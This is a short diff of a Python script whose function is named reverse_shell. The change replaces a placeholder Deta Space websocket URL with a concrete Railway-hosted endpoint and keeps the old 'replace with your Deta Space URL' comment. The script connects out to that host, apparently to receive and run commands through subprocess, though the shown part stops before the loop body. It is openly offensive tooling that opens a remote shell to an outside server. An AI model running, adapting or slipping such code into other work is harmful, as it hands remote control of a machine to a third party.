@@ -3,7 +3,7 @@ import websockets
 import subprocess
 
 async def reverse_shell():
-    uri = "wss://<your-app>.deta.dev/ws"  # replace with your Deta Space URL
+    uri = "ws://web-production-39bd.up.railway.app/ws"  # replace with your Deta Space URL
     async with websockets.connect(uri) as websocket:
         while True:
             try:
